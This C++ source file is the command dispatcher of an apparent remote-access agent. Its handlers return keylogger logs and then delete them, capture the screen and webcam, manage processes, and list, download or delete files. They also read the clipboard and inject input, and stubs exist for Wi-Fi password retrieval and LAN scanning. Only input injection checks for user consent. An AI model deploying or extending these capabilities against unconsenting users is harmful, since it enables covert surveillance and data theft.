#include "core/dispatcher.hpp"
#include "modules/process.hpp"
#include "modules/screen.hpp"
#include "modules/camera.hpp"
#include "modules/system_control.hpp"
#include "modules/consent.hpp"
#include "utils/base64.hpp"
#include "utils/json.hpp"
#include "utils/limits.hpp"
#include "utils/path_utils.hpp"

#include <iostream>
#include <fstream>
#include <cstdio> // Cho std::remove
#include <cerrno> // Cho ENOENT (Error No Entry)
#include <optional>
#include <filesystem>
#include <vector>
#include <cstdlib>
#include <algorithm>
#include <cstdint>
#include <system_error>

#define KEYLOGGER_FILE_NAME "keylogger.txt"

namespace {
void ensure_response_shape(const std::string& cmd, Json& resp) {
    if (!resp.contains("cmd")) {
        resp["cmd"] = cmd.empty() ? "unknown" : cmd;
    }
    if (!resp.contains("status")) {
        resp["status"] = resp.contains("error") ? "error" : "ok";
    }
}

Json build_error_response(const std::string& cmd, const std::string& code, const std::string& message) {
    Json resp;
    resp["cmd"] = cmd.empty() ? "unknown" : cmd;
    resp["status"] = "error";
    resp["error"] = code;
    resp["message"] = message;
    return resp;
}
} // namespace
std::string Dispatcher::handle(const std::string& request_json)
{
    std::cout << "[Dispatcher] Incoming request: " << request_json << "\n";

    Json res;
    std::optional<std::string> request_id;
    std::string cmd;

    try {
        if (request_json.size() > limits::kMaxMessageBytes) {
            res = build_error_response("unknown", "message_too_large", "Message too large");
            return res.dump();
        }

        JsonParseResult parsed = parse_json_safe(request_json);
        if (!parsed.ok) {
            res = build_error_response("unknown", parsed.error, "Invalid JSON");
            return res.dump();
        }

        Json req = std::move(parsed.value);
        cmd = req.value("cmd", "");
        if (req.contains("requestId") && req["requestId"].is_string()) {
            request_id = req["requestId"].get<std::string>();
        }

        if (cmd.empty()) {
            res["cmd"] = "unknown";
            res["status"] = "error";
            res["error"] = "missing_cmd";
            res["message"] = "Missing cmd";
        }
        else if (cmd == "ping") {
            res = handle_ping(req);
        }
        else if (cmd == "process_list") {
            res = handle_process_list(req);
        }
        else if (cmd == "process_kill") {
            res = handle_process_kill(req);
        }
        else if (cmd == "process_start") {
            res = handle_process_start(req);
        }
        else if (cmd == "screen") {
            res = handle_screen(req);
        }
        else if (cmd == "camera") {
            res = handle_camera(req);
        }
        else if (cmd == "camera_video") {
            res = handle_camera_video(req);   
        }
        else if (cmd == "screen_stream") {
            res = handle_screen_stream(req);
        }
        else if (cmd == "getkeylogs") {
            res = handle_getkeylogs(req);
        }
        else if (cmd == "clearlogs") {
            res = handle_clearlogs(req);
        }
        else if (cmd == "list-files") {
            res = handle_list_files(req);
        }
        else if (cmd == "download-file") {
            res = handle_download_file(req);
        }
        else if (cmd == "delete-file") {
            res = handle_delete_file(req);
        }
        else if (cmd == "clipboard-get") {
            res = handle_clipboard_get(req);
        }
        else if (cmd == "input-event") {
            res = handle_input_event(req);
        }
        else if (cmd == "sysinfo" || cmd == "scanlan" || cmd == "wifi-pass") {
            res["cmd"] = cmd;
            res["status"]  = "error";
            res["error"] = "not_implemented";
            res["message"] = "Command '" + cmd + "' is not yet implemented in the backend.";
        }
        else {
            res["cmd"] = cmd.empty() ? "unknown" : cmd;
            res["status"] = "error";
            res["error"] = "unknown_command";
            res["message"] = "Unknown command";
        }
    }
    catch (const std::exception& e) {
        res = build_error_response(cmd, "exception", std::string("Exception: ") + e.what());
    }

    ensure_response_shape(cmd, res);
    if (request_id) {
        res["requestId"] = *request_id;
    }
    return res.dump();
}

// ----------------------- HANDLERS -----------------------
Json Dispatcher::handle_getkeylogs(const Json&)
{
    std::ifstream ifs(KEYLOGGER_FILE_NAME, std::ios::in);
    Json resp;
    resp["cmd"] = "getkeylogs";

    if (!ifs.is_open()) {
        resp["status"] = "ok";
        // Nếu file không tồn tại, trả về kết quả rỗng (UI sẽ hiển thị)
        resp["result"] = "--- Log file not found or empty. ---";
        return resp;
    }

    // Đọc toàn bộ nội dung file
    std::string content((std::istreambuf_iterator<char>(ifs)),
                        std::istreambuf_iterator<char>());
    ifs.close();
    
    // Tự động xóa file sau khi đọc (theo yêu cầu UI)
    if (std::remove(KEYLOGGER_FILE_NAME) != 0) {
        std::cerr << "[Dispatcher] Warning: Failed to delete keylogger file after reading. Error: " << errno << "\n";
    }

    resp["status"] = "ok";
    resp["result"] = content;
    return resp;
}

Json Dispatcher::handle_clearlogs(const Json&)
{
    Json resp;
    resp["cmd"] = "clearlogs";

    if (std::remove(KEYLOGGER_FILE_NAME) != 0) {
        // Kiểm tra lỗi, ENOENT (File not found) là lỗi OK (vì mục đích là xóa)
        if (errno == ENOENT) {
            resp["status"] = "ok";
            resp["message"] = "Log file already deleted or not found.";
        } else {
            resp["status"] = "error";
            resp["message"] = "Failed to delete log file.";
        }
    } else {
        resp["status"] = "ok";
        resp["message"] = "Log file cleared successfully.";
    }
    return resp;
}

Json Dispatcher::handle_ping(const Json&)
{
    return {
        {"status", "ok"},
        {"message", "pong"}
    };
}

Json Dispatcher::handle_process_list(const Json&)
{
    ProcessManager pm;
    return pm.list_processes();
}

Json Dispatcher::handle_process_kill(const Json& req)
{
    int pid = req.value("pid", -1);
    if (pid < 0) {
        return {
            {"status", "error"},
            {"message", "Missing or invalid 'pid'"}
        };
    }

    ProcessManager pm;
    return pm.kill_process(pid);
}

Json Dispatcher::handle_process_start(const Json& req)
{
    if (!req.contains("path") || !req["path"].is_string()) {
        return {
            {"status", "error"},
            {"message", "Missing or invalid 'path'"}
        };
    }

    std::string path = req["path"].get<std::string>();
    ProcessManager pm;
    return pm.start_process(path);
}

Json Dispatcher::handle_screen(const Json&)
{
    ScreenCaptureOptions options;
    auto result = ScreenCapture::capture_base64(options);

    return {
        {"status", "ok"},
        {"image_base64", result.base64}
    };
}

Json Dispatcher::handle_camera(const Json& req)
{
    Camera cam;
    std::string b64;

    if (cam.captureFrame(b64)) {
        Json resp;
        resp["image_base64"] = b64;
        return resp;
    }

    Json err;
    err["error"] = "camera_failed";
    return err;
}

Json Dispatcher::handle_camera_video(const Json& req)
{
    int duration = 10;
    if (req.contains("duration") && req["duration"].is_number_integer()) {
        duration = req["duration"];
        if (duration <= 0) duration = 10;
        if (duration > 30) duration = 30; // tránh gửi video quá dài
    }

    Camera cam;
    std::string b64video;
    std::string format;

    if (!cam.captureVideo(duration, b64video, format)) {
        Json err;
        err["cmd"] = "camera_video";
        err["status"] = "error";
        err["error"] = "camera_video_failed";
        return err;
    }

    Json resp;
    resp["cmd"] = "camera_video";
    resp["status"] = "ok";
    resp["format"] = format;          // "avi"
    resp["video_base64"] = b64video;
    return resp;
}

Json Dispatcher::handle_screen_stream(const Json& req)
{
    int duration = 5;
    int fps = 3;

    if (req.contains("duration"))
        duration = req["duration"];

    if (req.contains("fps"))
        fps = req["fps"];

    Json resp;
    resp["cmd"] = "screen_stream";
    resp["status"] = "accepted";
    resp["duration"] = duration;
    resp["fps"] = fps;

    return resp;
}

Json Dispatcher::handle_list_files(const Json& req)
{
    Json resp;
    resp["cmd"] = "list-files";

    if (!req.contains("dir") || !req["dir"].is_string()) {
        resp["status"] = "error";
        resp["error"] = "invalid_request";
        resp["message"] = "Missing or invalid dir";
        return resp;
    }

    std::string dir = req["dir"].get<std::string>();
    SafePathResult path_result;
    if (!resolve_safe_path(dir, path_result)) {
        resp["status"] = "error";
        resp["error"] = path_result.error;
        const std::string root_str = path_result.root.lexically_normal().generic_string();
        resp["message"] = "Path not allowed (root: " + root_str + ")";
        resp["root"] = root_str;
        resp["dir"] = dir;
        return resp;
    }

    std::error_code ec;
    if (!std::filesystem::exists(path_result.resolved, ec)) {
        resp["status"] = "error";
        resp["error"] = "not_found";
        resp["message"] = "Directory not found";
        resp["dir"] = dir;
        return resp;
    }
    if (!std::filesystem::is_directory(path_result.resolved, ec)) {
        resp["status"] = "error";
        resp["error"] = "not_directory";
        resp["message"] = "Path is not a directory";
        resp["dir"] = dir;
        return resp;
    }

    Json items = Json::array();
    std::filesystem::directory_iterator it(path_result.resolved, ec);
    if (ec) {
        resp["status"] = "error";
        resp["error"] = "permission_denied";
        resp["message"] = ec.message();
        resp["dir"] = dir;
        return resp;
    }

    std::filesystem::directory_iterator end;
    while (it != end) {
        std::error_code entry_ec;
        const auto& path = it->path();
        bool is_dir = it->is_directory(entry_ec);
        if (!entry_ec) {
            std::uintmax_t size = 0;
            if (!is_dir) {
                size = it->file_size(entry_ec);
                if (entry_ec) {
                    size = 0;
                }
            }

            std::string rel_path;
            std::filesystem::path relative = std::filesystem::relative(path, path_result.root, entry_ec);
            if (!entry_ec) {
                rel_path = relative.lexically_normal().generic_string();
            } else {
                rel_path = path.lexically_normal().generic_string();
            }

            Json item;
            item["name"] = path.filename().generic_string();
            item["path"] = rel_path.empty() ? path.filename().generic_string() : rel_path;
            item["is_dir"] = is_dir;
            item["size"] = static_cast<std::uintmax_t>(size);
            items.push_back(item);
        }

        it.increment(entry_ec);
        if (entry_ec) {
            entry_ec.clear();
        }
    }

    resp["status"] = "ok";
    resp["dir"] = dir;
    resp["items"] = items;
    return resp;
}

Json Dispatcher::handle_delete_file(const Json& req)
{
    Json resp;
    resp["cmd"] = "delete-file";

    if (!req.contains("path") || !req["path"].is_string()) {
        resp["status"] = "error";
        resp["error"] = "invalid_request";
        resp["message"] = "Missing or invalid path";
        return resp;
    }

    std::string path = req["path"].get<std::string>();
    SafePathResult path_result;
    if (!resolve_safe_path(path, path_result)) {
        resp["status"] = "error";
        resp["error"] = path_result.error;
        const std::string root_str = path_result.root.lexically_normal().generic_string();
        resp["message"] = "Path not allowed (root: " + root_str + ")";
        resp["root"] = root_str;
        resp["path"] = path;
        return resp;
    }

    std::error_code ec;
    bool removed = std::filesystem::remove(path_result.resolved, ec);
    if (!removed || ec) {
        resp["status"] = "error";
        if (ec == std::errc::no_such_file_or_directory) {
            resp["error"] = "not_found";
            resp["message"] = "File not found";
        } else if (ec == std::errc::permission_denied) {
            resp["error"] = "permission_denied";
            resp["message"] = "Permission denied";
        } else {
            resp["error"] = "delete_failed";
            resp["message"] = ec ? ec.message() : "Delete failed";
        }
        resp["path"] = path;
        return resp;
    }

    resp["status"] = "ok";
    resp["deleted"] = true;
    resp["path"] = path;
    return resp;
}

Json Dispatcher::handle_download_file(const Json& req)
{
    Json resp;
    resp["cmd"] = "download-file";

    if (!req.contains("path") || !req["path"].is_string()) {
        resp["status"] = "error";
        resp["error"] = "invalid_request";
        resp["message"] = "Missing or invalid path";
        return resp;
    }

    std::string path = req["path"].get<std::string>();
    SafePathResult path_result;
    if (!resolve_safe_path(path, path_result)) {
        resp["status"] = "error";
        resp["error"] = path_result.error;
        const std::string root_str = path_result.root.lexically_normal().generic_string();
        resp["message"] = "Path not allowed (root: " + root_str + ")";
        resp["root"] = root_str;
        resp["path"] = path;
        return resp;
    }

    std::size_t offset = 0;
    if (req.contains("offset")) {
        if (!req["offset"].is_number_integer()) {
            resp["status"] = "error";
            resp["error"] = "invalid_request";
            resp["message"] = "Invalid offset";
            resp["path"] = path;
            return resp;
        }
        offset = static_cast<std::size_t>(std::max<std::int64_t>(0, req["offset"].get<std::int64_t>()));
    }

    std::size_t max_bytes = limits::kMaxDownloadChunkBytes;
    if (req.contains("max_bytes")) {
        if (!req["max_bytes"].is_number_integer()) {
            resp["status"] = "error";
            resp["error"] = "invalid_request";
            resp["message"] = "Invalid max_bytes";
            resp["path"] = path;
            return resp;
        }
        auto requested = static_cast<std::size_t>(std::max<std::int64_t>(0, req["max_bytes"].get<std::int64_t>()));
        max_bytes = limits::clamp_download_chunk_bytes(requested);
    }

    std::error_code ec;
    auto file_size = std::filesystem::file_size(path_result.resolved, ec);
    if (ec) {
        resp["status"] = "error";
        if (ec == std::errc::no_such_file_or_directory) {
            resp["error"] = "not_found";
            resp["message"] = "File not found";
        } else if (ec == std::errc::permission_denied) {
            resp["error"] = "permission_denied";
            resp["message"] = "Permission denied";
        } else {
            resp["error"] = "read_failed";
            resp["message"] = ec.message();
        }
        resp["path"] = path;
        return resp;
    }

    if (offset >= file_size) {
        resp["status"] = "ok";
        resp["path"] = path;
        resp["offset"] = static_cast<std::uint64_t>(offset);
        resp["bytes_read"] = 0;
        resp["eof"] = true;
        resp["data_base64"] = "";
        return resp;
    }

    std::ifstream file(path_result.resolved, std::ios::binary);
    if (!file) {
        resp["status"] = "error";
        resp["error"] = "read_failed";
        resp["message"] = "Failed to open file";
        resp["path"] = path;
        return resp;
    }

    file.seekg(static_cast<std::streamoff>(offset), std::ios::beg);
    if (!file) {
        resp["status"] = "error";
        resp["error"] = "read_failed";
        resp["message"] = "Failed to seek file";
        resp["path"] = path;
        return resp;
    }

    std::size_t to_read = std::min<std::size_t>(max_bytes, static_cast<std::size_t>(file_size - offset));
    std::vector<unsigned char> buffer(to_read);
    file.read(reinterpret_cast<char*>(buffer.data()), static_cast<std::streamsize>(to_read));
    std::streamsize read_count = file.gcount();

    std::string encoded;
    if (read_count > 0) {
        encoded = base64_encode(buffer.data(), static_cast<std::size_t>(read_count));
    }

    bool eof = (offset + static_cast<std::size_t>(read_count)) >= file_size;

    resp["status"] = "ok";
    resp["path"] = path;
    resp["offset"] = static_cast<std::uint64_t>(offset);
    resp["bytes_read"] = static_cast<std::uint64_t>(read_count);
    resp["eof"] = eof;
    resp["data_base64"] = encoded;
    return resp;
}

Json Dispatcher::handle_clipboard_get(const Json&)
{
    Json resp;
    resp["cmd"] = "clipboard-get";
#ifdef _WIN32
    SystemControl control;
    std::string text;
    std::string error;
    if (!control.get_clipboard_text(text, error)) {
        resp["status"] = "error";
        resp["error"] = "read_failed";
        resp["message"] = error.empty() ? "Failed to read clipboard" : error;
        return resp;
    }
    resp["status"] = "ok";
    resp["text"] = text;
    return resp;
#else
    resp["status"] = "error";
    resp["error"] = "not_supported";
    resp["message"] = "clipboard supported on Windows only";
    return resp;
#endif
}

Json Dispatcher::handle_input_event(const Json& req)
{
    Json resp;
    resp["cmd"] = "input-event";

    static ConsentManager consent;
    const std::string client_ip = req.value("client_ip", "unknown");
    if (!consent.is_session_active() && !consent.request_permission(client_ip)) {
        resp["status"] = "error";
        resp["error"] = "consent_required";
        resp["message"] = "Explicit consent required";
        return resp;
    }

    if (!req.contains("kind") || !req["kind"].is_string()) {
        resp["status"] = "error";
        resp["error"] = "invalid_payload";
        resp["message"] = "Missing kind";
        return resp;
    }

    const std::string kind = req["kind"].get<std::string>();
    SystemControl control;
    std::string error;
    bool ok = false;

    if (kind == "mouse") {
        if (!req.contains("action") || !req["action"].is_string()) {
            resp["status"] = "error";
            resp["error"] = "invalid_payload";
            resp["message"] = "Missing mouse action";
            return resp;
        }
        const std::string action = req["action"].get<std::string>();
        if (action == "move") {
            if (!req.contains("x") || !req.contains("y") || !req["x"].is_number() || !req["y"].is_number()) {
                resp["status"] = "error";
                resp["error"] = "invalid_payload";
                resp["message"] = "Missing coordinates";
                return resp;
            }
            ok = control.send_mouse_move(req["x"].get<double>(), req["y"].get<double>(), error);
        } else if (action == "down" || action == "up") {
            if (!req.contains("button") || !req["button"].is_string()) {
                resp["status"] = "error";
                resp["error"] = "invalid_payload";
                resp["message"] = "Missing mouse button";
                return resp;
            }
            ok = control.send_mouse_button(action, req["button"].get<std::string>(), error);
        } else if (action == "wheel") {
            if (!req.contains("deltaY") || !req["deltaY"].is_number()) {
                resp["status"] = "error";
                resp["error"] = "invalid_payload";
                resp["message"] = "Missing wheel delta";
                return resp;
            }
            ok = control.send_mouse_wheel(req["deltaY"].get<int>(), error);
        } else {
            resp["status"] = "error";
            resp["error"] = "invalid_payload";
            resp["message"] = "Unknown mouse action";
            return resp;
        }
    } else if (kind == "key") {
        if (!req.contains("action") || !req["action"].is_string()) {
            resp["status"] = "error";
            resp["error"] = "invalid_payload";
            resp["message"] = "Missing key action";
            return resp;
        }
        if (!req.contains("code") || !req["code"].is_string() || !req.contains("key") || !req["key"].is_string()) {
            resp["status"] = "error";
            resp["error"] = "invalid_payload";
            resp["message"] = "Missing key data";
            return resp;
        }
        ok = control.send_key_event(req["action"].get<std::string>(),
                                    req["code"].get<std::string>(),
                                    req["key"].get<std::string>(),
                                    error);
    } else {
        resp["status"] = "error";
        resp["error"] = "invalid_payload";
        resp["message"] = "Unknown kind";
        return resp;
    }

    if (ok) {
        resp["status"] = "ok";
        return resp;
    }

    resp["status"] = "error";
    resp["error"] = error == "not_supported" ? "not_supported" : "invalid_payload";
    resp["message"] = error.empty() ? "Input event failed" : error;
    return resp;
}
